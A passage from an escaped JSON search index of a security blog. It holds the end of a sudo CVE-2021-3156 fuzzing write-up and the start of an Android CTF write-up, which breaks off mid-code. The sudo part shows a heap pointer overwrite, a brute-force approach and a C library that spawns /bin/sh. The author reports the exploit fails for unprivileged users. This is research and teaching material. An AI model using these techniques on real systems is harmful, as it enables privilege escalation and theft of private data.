\u0026#34;80\u0026#34; }, \u0026#34;bt\u0026#34;: [ { \u0026#34;raw\u0026#34;: \u0026#34;#0 __nss_module_get_function (module=0x4242424242422042, name=name@entry=0x7ffff7f52525 \\\u0026#34;initgroups_dyn\\\u0026#34;) at ./nss/nss_module.c:336\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;__nss_module_get_function\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;module=0x4242424242422042\u0026#34;, \u0026#34;name=name@entry=0x7ffff7f52525 \\\u0026#34;initgroups_dyn\\\u0026#34;\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./nss/nss_module.c:336\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#1 0x00007ffff7eecfad in __gi___nss_lookup_function (ni=\u0026lt;optimized out\u0026gt;, fct_name=fct_name@entry=0x7ffff7f52525 \\\u0026#34;initgroups_dyn\\\u0026#34;) at ./nss/nsswitch.c:137\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7eecfad\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;__gi___nss_lookup_function\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;ni=\u0026lt;optimized out\u0026gt;\u0026#34;, \u0026#34;fct_name=fct_name@entry=0x7ffff7f52525 \\\u0026#34;initgroups_dyn\\\u0026#34;\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./nss/nsswitch.c:137\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#2 0x00007ffff7e8bb8c in internal_getgrouplist (user=user@entry=0x55555558ce88 \\\u0026#34;root\\\u0026#34;, group=group@entry=0, size=size@entry=0x7fffffffd198, groupsp=groupsp@entry=0x7fffffffd1a0, limit=limit@entry=-1) at ./grp/initgroups.c:95\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7e8bb8c\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;internal_getgrouplist\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;user=user@entry=0x55555558ce88 \\\u0026#34;root\\\u0026#34;\u0026#34;, \u0026#34;group=group@entry=0\u0026#34;, \u0026#34;size=size@entry=0x7fffffffd198\u0026#34;, \u0026#34;groupsp=groupsp@entry=0x7fffffffd1a0\u0026#34;, \u0026#34;limit=limit@entry=-1\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./grp/initgroups.c:95\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#3 0x00007ffff7e8be28 in getgrouplist (user=0x55555558ce88 \\\u0026#34;root\\\u0026#34;, group=0, groups=0x7ffff7c5e010, ngroups=0x7fffffffd204) at ./grp/initgroups.c:156\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7e8be28\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;getgrouplist\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;user=0x55555558ce88 \\\u0026#34;root\\\u0026#34;\u0026#34;, \u0026#34;group=0\u0026#34;, \u0026#34;groups=0x7ffff7c5e010\u0026#34;, \u0026#34;ngroups=0x7fffffffd204\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./grp/initgroups.c:156\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#4 0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558ce88 \\\u0026#34;root\\\u0026#34;, basegid=0, groupsp=0x7fffffffd260, ngroupsp=0x7fffffffd254) at ./getgrouplist.c:105\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7fafde6\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudo_getgrouplist2_v1\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;name=0x55555558ce88 \\\u0026#34;root\\\u0026#34;\u0026#34;, \u0026#34;basegid=0\u0026#34;, \u0026#34;groupsp=0x7fffffffd260\u0026#34;, \u0026#34;ngroupsp=0x7fffffffd254\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./getgrouplist.c:105\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#5 0x00007ffff7d3b953 in sudo_make_gidlist_item (pw=0x55555558ce58, unused1=0x0, type=1) at ./pwutil_impl.c:272\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d3b953\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudo_make_gidlist_item\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;pw=0x55555558ce58\u0026#34;, \u0026#34;unused1=0x0\u0026#34;, \u0026#34;type=1\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./pwutil_impl.c:272\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#6 0x00007ffff7d3a367 in sudo_get_gidlist (pw=0x55555558ce58, type=1) at ./pwutil.c:932\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d3a367\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudo_get_gidlist\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;pw=0x55555558ce58\u0026#34;, \u0026#34;type=1\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./pwutil.c:932\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#7 0x00007ffff7d32683 in runas_getgroups () at ./match.c:145\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d32683\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;runas_getgroups\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;filename\u0026#34;: \u0026#34;./match.c:145\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#8 0x00007ffff7d202c7 in runas_setgroups () at ./set_perms.c:1714\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d202c7\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;runas_setgroups\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;filename\u0026#34;: \u0026#34;./set_perms.c:1714\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#9 0x00007ffff7d1ead8 in set_perms (perm=5) at ./set_perms.c:281\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d1ead8\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;set_perms\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;perm=5\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./set_perms.c:281\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#10 0x00007ffff7d16559 in sudoers_lookup (snl=0x7ffff7d5dce0 \u0026lt;snl\u0026gt;, pw=0x55555558ce58, validated=96, pwflag=0) at ./parse.c:303\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;10\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d16559\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudoers_lookup\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;snl=0x7ffff7d5dce0 \u0026lt;snl\u0026gt;\u0026#34;, \u0026#34;pw=0x55555558ce58\u0026#34;, \u0026#34;validated=96\u0026#34;, \u0026#34;pwflag=0\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./parse.c:303\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#11 0x00007ffff7d21776 in sudoers_policy_main (argc=6, argv=0x7fffffffdd38, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffd9c0) at ./sudoers.c:328\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;11\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d21776\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudoers_policy_main\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;argc=6\u0026#34;, \u0026#34;argv=0x7fffffffdd38\u0026#34;, \u0026#34;pwflag=0\u0026#34;, \u0026#34;env_add=0x0\u0026#34;, \u0026#34;verbose=false\u0026#34;, \u0026#34;closure=0x7fffffffd9c0\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./sudoers.c:328\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffdd38, env_add=0x0, command_infop=0x7fffffffdaa8, argv_out=0x7fffffffdab0, user_env_out=0x7fffffffdab8) at ./policy.c:872\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;12\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x00007ffff7d1ca7c\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;sudoers_policy_check\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;argc=6\u0026#34;, \u0026#34;argv=0x7fffffffdd38\u0026#34;, \u0026#34;env_add=0x0\u0026#34;, \u0026#34;command_infop=0x7fffffffdaa8\u0026#34;, \u0026#34;argv_out=0x7fffffffdab0\u0026#34;, \u0026#34;user_env_out=0x7fffffffdab8\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./policy.c:872\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#13 0x0000555555572f88 in policy_check (plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;, argc=6, argv=0x7fffffffdd38, env_add=0x0, command_info=0x7fffffffdaa8, argv_out=0x7fffffffdab0, user_env_out=0x7fffffffdab8) at ./sudo.c:1186\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x0000555555572f88\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;policy_check\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;plugin=0x555555583920 \u0026lt;policy_plugin\u0026gt;\u0026#34;, \u0026#34;argc=6\u0026#34;, \u0026#34;argv=0x7fffffffdd38\u0026#34;, \u0026#34;env_add=0x0\u0026#34;, \u0026#34;command_info=0x7fffffffdaa8\u0026#34;, \u0026#34;argv_out=0x7fffffffdab0\u0026#34;, \u0026#34;user_env_out=0x7fffffffdab8\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./sudo.c:1186\u0026#34; }, { \u0026#34;raw\u0026#34;: \u0026#34;#14 0x000055555556e6ed in main (argc=8, argv=0x7fffffffdd28, envp=0x7fffffffdd70) at ./sudo.c:301\u0026#34;, \u0026#34;num\u0026#34;: \u0026#34;14\u0026#34;, \u0026#34;addr\u0026#34;: \u0026#34;0x000055555556e6ed\u0026#34;, \u0026#34;funcname\u0026#34;: \u0026#34;main\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;argc=8\u0026#34;, \u0026#34;argv=0x7fffffffdd28\u0026#34;, \u0026#34;envp=0x7fffffffdd70\u0026#34; ], \u0026#34;filename\u0026#34;: \u0026#34;./sudo.c:301\u0026#34; } ], \u0026#34;exit_code\u0026#34;: 300 } } we write one more hacky python script (heap-fuzzer-crash-triage.py) that is able to read the json results file, parse it, and re-run the sudo binary exactly in the same way so that we can reproduce the crash. with some cyclic_gen magic and messing around with arguments, we figure out exactly which part of argv influences the parameter module=0x4242424242422042. it is a partial overwrite. here is how the module parameter looks like under non-crashing execution:\n► 0x7ffff7eeedc0 \u0026lt;__nss_module_get_function\u0026gt; push r15 0x7ffff7eeedc2 \u0026lt;__nss_module_get_function+2\u0026gt; push r14 0x7ffff7eeedc4 \u0026lt;__nss_module_get_function+4\u0026gt; push r13 [ backtrace ] ► 0 0x7ffff7eeedc0 __nss_module_get_function 1 0x7ffff7eecfad __nss_lookup_function+13 2 0x7ffff7e8bb8c internal_getgrouplist+188 3 0x7ffff7e8be28 getgrouplist+104 4 0x7ffff7fafde6 sudo_getgrouplist2_v1+208 5 0x7ffff7d3b953 sudo_make_gidlist_item+481 6 0x7ffff7d3a367 sudo_get_gidlist+560 7 0x7ffff7d32683 runas_getgroups+221 pwndbg\u0026gt; $ p module $3 = (struct nss_module *) 0x555555588d90 pwndbg\u0026gt; $ p * module $2 = { state = 1, functions = { typed = { endaliasent = 0x244a4e5c2b67897, endetherent = 0x244a4e521967897, .... }, untyped = {0x244a4e5c2b67897, ..., 0x244a4e527967897} }, handle = 0x0, next = 0x0, name = 0x555555588fa8 \u0026#34;files\u0026#34; } after fiddling around, it seems like an off-by-one overflow is sufficient. with an off-by-one, and the fact that the overflow is comming from argv, the parameter module=0x555555588d90 would look like module=0x5555555800xx afterwards. xx is bytes that we control and then a null byte follows, because argv arguments are null terminated. so, let\u0026rsquo;s brute-force xx using brutter.sh until our pre-conditions are met.\nand apparently for xx=01 it works! here is the output from gdb when given an input that corrupts the module parameter to 0x555555580001\n► 0x7ffff7eeedc0 \u0026lt;__nss_module_get_function\u0026gt; push r15 0x7ffff7eeedc2 \u0026lt;__nss_module_get_function+2\u0026gt; push r14 0x7ffff7eeedc4 \u0026lt;__nss_module_get_function+4\u0026gt; push r13 [ backtrace ] ► 0 0x7ffff7eeedc0 __nss_module_get_function 1 0x7ffff7eecfad __nss_lookup_function+13 2 0x7ffff7e8bb8c internal_getgrouplist+188 3 0x7ffff7e8be28 getgrouplist+104 4 0x7ffff7fafde6 sudo_getgrouplist2_v1+208 5 0x7ffff7d3b953 sudo_make_gidlist_item+481 6 0x7ffff7d3a367 sudo_get_gidlist+560 7 0x7ffff7d32683 runas_getgroups+221 pwndbg\u0026gt; $ p module $5 = (struct nss_module *) 0x555555580001 pwndbg\u0026gt; $ p *module $4 = { state = 0, // this is imporant functions = { typed = { endaliasent = 0x0, endetherent = 0x0, //... }, untyped = {0x0 \u0026lt;repeats 64 times\u0026gt;} }, handle = 0x0, next = 0x0, name = 0x555555580219 \u0026#34;\u0026#34; //this is important } pwndbg\u0026gt; $ c [ registers / show-flags off / show-compact-regs off ] *rdi 0x55555558e320 ◂— \u0026#39;libnss_.so.2\u0026#39; *rip 0x7ffff7f0a440 (__libc_dlopen_mode) ◂— push rbx [ disasm / x86-64 / set emulate on ] ► 0x7ffff7f0a440 \u0026lt;__libc_dlopen_mode\u0026gt; push rbx 0x7ffff7f0a441 \u0026lt;__libc_dlopen_mode+1\u0026gt; sub rsp, 0x30 0x7ffff7f0a445 \u0026lt;__libc_dlopen_mode+5\u0026gt; mov rax, qword ptr fs:[0x28] [ backtrace ] ► 0 0x7ffff7f0a440 __libc_dlopen_mode 1 0x7ffff7eee907 module_load+167 2 0x7ffff7eeee05 __nss_module_get_function+69 3 0x7ffff7eeee05 __nss_module_get_function+69 4 0x7ffff7eecfad __nss_lookup_function+13 5 0x7ffff7e8bb8c internal_getgrouplist+188 6 0x7ffff7e8be28 getgrouplist+104 7 0x7ffff7fafde6 sudo_getgrouplist2_v1+208 pwndbg\u0026gt; $ frame #0 __libc_dlopen_mode (name=0x55555558e320 \u0026#34;libnss_.so.2\u0026#34;, mode=mode@entry=-2147483646) at ./elf/dl-libc.c:152 152 in ./elf/dl-libc.c pwndbg\u0026gt; $ x/1s $rdi 0x55555558e320: \u0026#34;libnss_.so.2\u0026#34; as you can see, the sudo binary is ready to load libnss_.so.2. however, this library does not exist in the system! maybe with ld_library_path=. sudo we can force sudo to load it (dumb excitment kicks in). so, we quickly prepare our malicious library:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void foo() { printf(\u0026#34;foo\\n\u0026#34;); } __attribute__((constructor)) void init() { char *args[] = { \u0026#34;/bin/sh\u0026#34;, null }; execve(args[0], args, null); } let\u0026rsquo;s try running ld_library_path=. sudo now without gdb and corrupt the pointer to module=0x555555580001:\nand it works! let\u0026rsquo;s also re-enable aslr as we had disabled it at some point. with aslr and by using brutter.sh, we are still able to sueccessfully execute our exploit and get a shell.\nlet\u0026rsquo;s finally now try our exploit as user:\nand it is a failure. maybe we have to use a different value for xx? let\u0026rsquo;s switch back to aslr off. running brutter.sh did not work. even trying to brute-force 2 bytes does not work.\nwhat is the issue here?\npitfalls and hard reality well, one dumb thing that we did and is now biting us back is that we fuzzed the heap as root, because we wanted gdb. we relied on spawning sudo with gdb as root and we were lazy to implement a mechanism that allows to attach to sudo executed as user. the heap layout might be slightly different enough so that our exploit is now not corrupting the module pointer.\nanother dumb thing is that we are using ld_library_path with a setuid binary. oh god. rtfm before jumping into action! here is the man page:\nif a shared object dependency does not contain a slash, then it\nis searched for in the following order:\n(1) using the directories specified in the dt_rpath dynamic\nsection attribute of the binary if present and dt_runpath\nattribute does not exist. use of dt_rpath is deprecated.\n(2) using the environment variable ld_library_path, unless the\nexecutable is being run in secure-execution mode (see\nbelow), in which case this variable is ignored.\n\u0026hellip;\na binary is executed in secure-execution mode if the at_secure\nentry in the auxiliary vector (see getauxval(3)) has a nonzero\nvalue. this entry may have a nonzero value for various reasons,\nincluding:\nthe process\u0026rsquo;s real and effective user ids differ, or the real\nand effective group ids differ. this typically occurs as a\nresult of executing a set-user-id or set-group-id program. and yes we are running in secure-execution mode. this is also very easy to test with a our lib and a dummy binary. if the binary is setuid then ld_library_path will not work.\nanother thing is that our exploit uses gconv_path in the environment variables. here is the manual once again:\nsecure-execution mode\nfor security reasons, if the dynamic linker determines that a\nbinary should be run in secure-execution mode, the effects of\nsome environment variables are voided or modified, and\nfurthermore those environment variables are stripped from the\nenvironment, so that the program does not even see the\ndefinitions. some of these environment variables affect the\noperation of the dynamic linker itself, and are described below.\nother environment variables treated in this way include:\ngconv_path, getconf_dir, hostaliases, localdomain, locpath,\nmalloc_trace, nis_path, nlspath, resolv_host_conf, res_options,\ntmpdir, and tzdir.\n\u0026hellip;\nld_library_path: a list of directories in which to search for elf libraries\nat execution time. the items in the list are separated by\neither colons or semicolons, and there is no support for\nescaping either separator. a zero-length directory name\nindicates the current working directory.\nthis variable is ignored in secure-execution mode.\nconclusion due to time constraints, this project ends here, unfortunately without exploiting sudo as user. it is not impossible, but would require some more significant engineering effort. our initial goal of this journey was to learn more about fuzzing. crafting an exploit for the bug was a bonus point.\nit was a fun ride and we learned a lot. going from zero (where are you bug?) to hero (rce) definately takes a lot of effort and there are a lot of intermmediate steps. the pitfalls are numerous and each time you fall into one, you have to go steps back, redo things in the proper way, and then proceed. otherwise, laziness will bite you back. sometimes you have to fail first to know the answer afterwards. that is the nature of research anyway. the answer is potentially unknown.\n","title":"Down the modern sudoedit rabbit hole - CVE-2021-3156"},{"date":"2024-02-24","image":"/post-resources/cryptonotes/cover.png","imageAlt":"","link":"https://chalkiadakis.me/posts/insomnihack-teaser24/cryptonotes/","summary":"Who said memory corruption vulnerabilities in Android applications are not exploitable?","tags":["Android","ctf","insomni'hack","pwn"],"text":" poc: github.com/nikoschalk/ctf-writeups/tree/master/insomnihack2024/cryptonotes/solution/maliciousapp\ncategories: pwn, android\ndescription:\ninsomni\u0026rsquo;hack teaser 2024 - cryptonotes\nour security researcher saved a sensitive note in his new note-taking application. i convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.\nsystem running: system-images;android-30;google_apis_playstore;x86_64\nsubmitting server: https://cryptonotes.insomnihack.ch:44300\nnote app: notes.apk [archived]\nthe flag format is: ins{notecontent}\nauthor: dai\nso, for this challenge:\nwe are given a note-keeping application which is supposedly secure. we are requested to write an arbitrary application and submit it to the system. both applications will run in an emulator in the following environment: system-images;android-30;google_apis_playstore;x86_64 initial interaction let\u0026rsquo;s start the application and see what it is doing:\nas we can see, the application is a simple note-keeping application. it gives us 3 options:\nadd a plaintext note add an encrypted note using algorithm a1 (alg1) add an encrypted note using algorithm a2 (alg2) once the notes are saved, we can no longer edit them. only delete them. the flag is saved as one of these notes in the remote.\nreversing reversing mobile applications is easy as they are written in java/kotlin. let\u0026rsquo;s throw the application in jadx.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;manifest xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:versioncode=\u0026#34;1\u0026#34; android:versionname=\u0026#34;1.0\u0026#34; android:compilesdkversion=\u0026#34;33\u0026#34; android:compilesdkversioncodename=\u0026#34;13\u0026#34; package=\u0026#34;com.inso.ins24\u0026#34; platformbuildversioncode=\u0026#34;33\u0026#34; platformbuildversionname=\u0026#34;13\u0026#34;\u0026gt; \u0026lt;uses-sdk android:minsdkversion=\u0026#34;21\u0026#34; android:targetsdkversion=\u0026#34;33\u0026#34;/\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;read_external_storage\u0026#34;/\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.internet\u0026#34;/\u0026gt; \u0026lt;permission android:name=\u0026#34;com.inso.ins24.dynamic_receiver_not_exported_permission\u0026#34; android:protectionlevel=\u0026#34;signature\u0026#34;/\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;com.inso.ins24.dynamic_receiver_not_exported_permission\u0026#34;/\u0026gt; \u0026lt;application android:theme=\u0026#34;@style/theme_ins24\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:debuggable=\u0026#34;true\u0026#34; android:allowbackup=\u0026#34;false\u0026#34; android:supportsrtl=\u0026#34;true\u0026#34; android:fullbackupcontent=\u0026#34;@xml/backup_rules\u0026#34; android:roundicon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:appcomponentfactory=\u0026#34;androidx.core.app.corecomponentfactory\u0026#34; android:dataextractionrules=\u0026#34;@xml/data_extraction_rules\u0026#34;\u0026gt; \u0026lt;activity android:name=\u0026#34;com.inso.ins24.noteapiactivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.inso.ins24.noteviewactivity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.inso.ins24.noteeditoractivity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.inso.ins24.mainactivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.main\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.launcher\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;provider android:name=\u0026#34;androidx.startup.initializationprovider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;com.inso.ins24.androidx-startup\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;androidx.emoji2.text.emojicompatinitializer\u0026#34; android:value=\u0026#34;androidx.startup\u0026#34;/\u0026gt; \u0026lt;meta-data android:name=\u0026#34;androidx.lifecycle.processlifecycleinitializer\u0026#34; android:value=\u0026#34;androidx.startup\u0026#34;/\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;/application\u0026gt; \u0026lt;/manifest\u0026gt; from the application\u0026rsquo;s androidmanifest.xml we can make the following observations:\nthere are 2 exported activities. exported components allow us to interact with the target application from another application (i.e. interact from the application that we will write). dynamic_receiver_not_exported_permission is not interesting as it is standard android 13 behavior and with correct protectionlevel=\u0026quot;signature\u0026quot; the target can do network communication (android.permission.internet) the target has read_external_storage and since the target runs on android-30 (build.version_codes.r), it is also automatically granted the write_external_storage permission. the target has debuggable=\u0026quot;true\u0026quot;, although i am uncertain if this is exploitable from the context of another application. here are also the application\u0026rsquo;s classes:\nso, let\u0026rsquo;s start with the mainactivity:\npackage com.inso.ins24; import android.app.alertdialog; import android.content.dialoginterface; import android.content.intent; import android.content.sharedpreferences; import android.os.bundle; import android.view.menu; import android.view.menuitem; import android.view.view; import android.widget.adapterview; import android.widget.arrayadapter; import android.widget.listadapter; import android.widget.listview; import android.widget.textview; import androidx.appcompat.app.appcompatactivity; import com.google.gson.gson; import com.inso.ins24.utils.cryptoconfig; import java.util.arraylist; import java.util.hashset; import java.util.list; /* loaded from: classes4.dex */ public class mainactivity extends appcompatactivity { static arrayadapter adapter; static string cryptoconfig = \u0026#34;{\u0026#39;algo\u0026#39;:[65,76,71,79,49],\u0026#39;in\u0026#39;:\u0026#39;this is a notes\u0026#39;}\u0026#34;; static cryptoconfig cryptoconf; static gson gson; static list\u0026lt;string\u0026gt; notes2; textview emptytv; listview noteslistview; sharedpreferences sharedpreferences; static { gson gson2 = new gson(); gson = gson2; cryptoconf = (cryptoconfig) gson2.fromjson(cryptoconfig, (class\u0026lt;object\u0026gt;) cryptoconfig.class); } public static string encrypt(string note, byte[] algo) { return cryptoconfig.docipher(algo, note); } @override // androidx.fragment.app.fragmentactivity, androidx.activity.componentactivity, androidx.core.app.componentactivity, android.app.activity protected void oncreate(bundle savedinstancestate) { super.oncreate(savedinstancestate); setcontentview(r.layout.activity_main); this.noteslistview = (listview) findviewbyid(r.id.notes_listview); this.emptytv = (textview) findviewbyid(r.id.emptytv); system.loadlibrary(\u0026#34;ins24\u0026#34;); if (getintent().hasextra(\u0026#34;exit\u0026#34;)) { finish(); } this.sharedpreferences = getsharedpreferences(\u0026#34;com.inso.ins24.mynotes\u0026#34;, 0); notes2 = new arraylist(); hashset\u0026lt;string\u0026gt; noteset2 = (hashset) this.sharedpreferences.getstringset(\u0026#34;notes\u0026#34;, null); if (noteset2 == null || noteset2.isempty()) { this.emptytv.setvisibility(0); } else { this.emptytv.setvisibility(8); notes2 = new arraylist(noteset2); } arrayadapter arrayadapter = new arrayadapter(getapplicationcontext(), (int) r.layout.custom_note_row, (int) r.id.notestv, notes2); adapter = arrayadapter; this.noteslistview.setadapter((listadapter) arrayadapter); this.noteslistview.setonitemclicklistener(new adapterview.onitemclicklistener() { // from class: com.inso.ins24.mainactivity.1 @override // android.widget.adapterview.onitemclicklistener public void onitemclick(adapterview\u0026lt;?\u0026gt; parent, view view, int position, long id) { intent intent = new intent(mainactivity.this.getapplicationcontext(), noteviewactivity.class); intent.putextra(\u0026#34;noteid\u0026#34;, position); mainactivity.this.startactivity(intent); } }); this.noteslistview.setonitemlongclicklistener(new adapterview.onitemlongclicklistener() { // from class: com.inso.ins24.mainactivity.2 @override // android.widget.adapterview.onitemlongclicklistener public boolean onitemlongclick(adapterview\u0026lt;?\u0026gt; parent, view view, final int position, long id) { new alertdialog.builder(mainactivity.this).settitle(\u0026#34;are you sure ?\u0026#34;).setmessage(\u0026#34;do you want to delete this note\u0026#34;).setpositivebutton(\u0026#34;yes\u0026#34;, new dialoginterface.onclicklistener() { // from class: com.inso.ins24.mainactivity.2.1 @override // android.content.dialoginterface.onclicklistener public void onclick(dialoginterface dialog, int which) { mainactivity.notes2.remove(position); mainactivity.adapter.notifydatasetchanged(); hashset\u0026lt;string\u0026gt; noteset = new hashset\u0026lt;\u0026gt;(mainactivity.notes2); mainactivity.this.sharedpreferences.edit().putstringset(\u0026#34;notes\u0026#34;, noteset).apply(); if (noteset.isempty()) { mainactivity.this.emptytv.setvisibility(0); } } }).setnegativebutton(\u0026#34;no\u0026#34;, (dialoginterface.onclicklistener) null).show(); return true; } }); } @override // android.app.activity public boolean oncreateoptionsmenu(menu menu) { getmenuinflater().inflate(r.menu.add_note_menu, menu); return super.oncreateoptionsmenu(menu); } @override // android.app.activity public boolean onoptionsitemselected(menuitem item) { super.onoptionsitemselected(item); if (item.getitemid() == r.id.add_note) { startactivity(new intent(getapplicationcontext(), noteeditoractivity.class).putextra(\u0026#34;encrypted\u0026#34;, false)); finish(); return true; } else if (item.getitemid() == r.id.add_note_encrypted1) { startactivity(new intent(getapplicationcontext(), noteeditoractivity.class).putextra(\u0026#34;encrypted\u0026#34;, true).putextra(\u0026#34;algo\u0026#34;, 1)); finish(); return true; } else if (item.getitemid() != r.id.add_note_encrypted2) { return false; } else { startactivity(new intent(getapplicationcontext(), noteeditoractivity.class).putextra(\u0026#34;encrypted\u0026#34;, true).putextra(\u0026#34;algo\u0026#34;, 2)); finish(); return true; } } } there are a few interesting things happening here:\nsystem.loadlibrary(\u0026quot;ins24\u0026quot;); - the application loads a native library the notes are saved in getsharedpreferences(\u0026quot;com.inso.ins24.mynotes\u0026quot;, 0);. this sharedpreference is created with mode 0=mode_private. sharedpreferences private to the application are stored in the application\u0026rsquo;s private folder, so the notes will be saved in /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml, which is only accessible to the owning application. if the mainactivity is launched with an intent that contains the extra exit, then finish() will be invoked. this method comes from the appcompatactivity class and will invoke ondestroy() - basically destroying the activity. note also that the full body method of oncreate will be executed even when the exit extra is passed, because there is no return inside the if case: if (getintent().hasextra(\u0026#34;exit\u0026#34;)) { finish(); //no return here } //control flow continues! let\u0026rsquo;s also check the noteapiactivity which is also exported:\npackage com.inso.ins24; import android.content.sharedpreferences; import android.os.bundle; import androidx.appcompat.app.appcompatactivity; import java.util.arraylist; import java.util.hashset; import java.util.list; /* loaded from: classes4.dex */ public class noteapiactivity extends appcompatactivity { @override // 